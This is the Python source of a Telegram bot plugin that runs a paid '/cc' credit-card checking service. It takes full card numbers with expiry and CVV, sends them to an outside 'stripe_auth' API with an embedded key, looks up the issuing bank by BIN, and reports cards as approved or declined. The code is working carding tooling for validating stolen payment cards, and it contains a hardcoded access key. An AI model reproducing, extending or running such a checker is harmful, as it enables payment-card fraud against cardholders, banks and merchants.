from pyrogram import Client, filters
import requests, re, time
from plugins.func.users_sql import *

session = requests.Session()

@Client.on_message(filters.command("cc"))
async def cmd_cc(Client, message):
    try:
        user_id = str(message.from_user.id)
        chat_id = message.chat.id
        chat_type = str(message.chat.type)

        regdata = fetchinfo(user_id)
        if str(regdata) == 'None':
            return await message.reply_text("You're not registered. Use /register first.", message.id)

        status = regdata[2]
        role = status
        credit = int(regdata[5])
        antispam_time = int(regdata[7])
        now = int(time.time())

        GROUP = open("plugins/group.txt").read().splitlines()
        if chat_type == "ChatType.PRIVATE" and role == "FREE":
            return await message.reply_text("Only premium users can use in PM.", message.id)
        elif chat_type in ["ChatType.GROUP", "ChatType.SUPERGROUP"] and str(chat_id) not in GROUP:
            return await message.reply_text("Unauthorized chat. Contact admin.", message.id)

        if credit < 1:
            return await message.reply_text("❌ Insufficient credit.", message.id)

        wait_time = 15 if role == 'FREE' else 5
        if now - antispam_time < wait_time:
            return await message.reply_text(f"⏳ Wait {wait_time - (now - antispam_time)} seconds (AntiSpam)", message.id)

        if message.reply_to_message:
            cc = message.reply_to_message.text
        else:
            cc = message.text[len('/cc '):].strip()

        match = re.search(r'(\d{12,16})[|:\s,-](\d{1,2})[|:\s,-](\d{2,4})[|:\s,-](\d{3,4})', cc)
        if not match:
            return await message.reply_text("❌ Invalid format. Use cc|mm|yy|cvv", message.id)

        ccnum, mes, ano, cvv = match.groups()
        fullcc = f"{ccnum}|{mes}|{ano}|{cvv}"

        check_msg = await message.reply_text(f"""
┏━━━━━━━⍟
┃  Stripe Auth 
┗━━━━━━━━━━━⊛
⊙ CC: {fullcc}
⊙ Status: Checking...
⊙ Response: Waiting for Response...
""", reply_to_message_id=message.id)

        tic = time.perf_counter()
        url = f"https://barryxapi.xyz/stripe_auth?key=BRY-FGKD5-MDYRI-56HDM&card={fullcc}"

        try:
            res = session.get(url, timeout=15)
            data = res.json()
            result = data.get("result", {})
            card_status = result.get("status", "").lower()
            card_message = result.get("message", "No message")
        except Exception:
            card_status = "error"
            card_message = "Invalid response or timeout"

        toc = time.perf_counter()

        # BIN Lookup
        try:
            binres = session.get(f"https://bins.antipublic.cc/bins/{ccnum[:6]}", timeout=10).json()
            brand = binres.get("vendor") or binres.get("scheme") or "UNKNOWN"
            type_ = binres.get("type", "N/A")
            level = binres.get("level", "N/A")
            bank = binres.get("bank", "N/A")
            country = binres.get("country_name", "N/A")
            flag = binres.get("country_flag", "")
        except:
            try:
                bininfo = session.get(f"https://lookup.binlist.net/{ccnum[:6]}", timeout=10).json()
                brand = bininfo.get("scheme", "UNKNOWN")
                type_ = bininfo.get("type", "N/A")
                level = bininfo.get("brand", "N/A")
                bank = bininfo.get("bank", {}).get("name", "N/A")
                country = bininfo.get("country", {}).get("name", "N/A")
                flag = bininfo.get("country", {}).get("emoji", "")
            except:
                brand = type_ = level = bank = country = flag = "N/A"

        # Format BIN
        brand = str(brand).upper()
        type_ = str(type_).upper()
        level = str(level).upper()
        bank = str(bank).upper()
        country = str(country).upper()

        # Status Mapping
        if card_status in ["approved", "charged", "insufficient_funds", "incorrect_cvc"]:
            status = "Approved ✅"
        else:
            status = "Declined ❌"

        final_msg = f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Stripe Auth</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> {status}
<b>⊙ Response:</b> {card_message}
<b>⊙ Bank:</b> {bank}
<b>⊚ Bin type:</b> {brand} - {type_} - {level}
<b>⊙ Country:</b> {country} {flag}
<b>⊙ Time:</b> {toc - tic:.2f}s
<b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>
"""

        # Edit or reply fallback
        if final_msg.strip() != check_msg.text.strip():
            await Client.edit_message_text(chat_id, check_msg.id, final_msg)
        else:
            await message.reply_text(final_msg)

        updatedata(user_id, "credits", credit - 1)
        updatedata(user_id, "antispam_time", now)
        await plan_expirychk(user_id)

    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)}")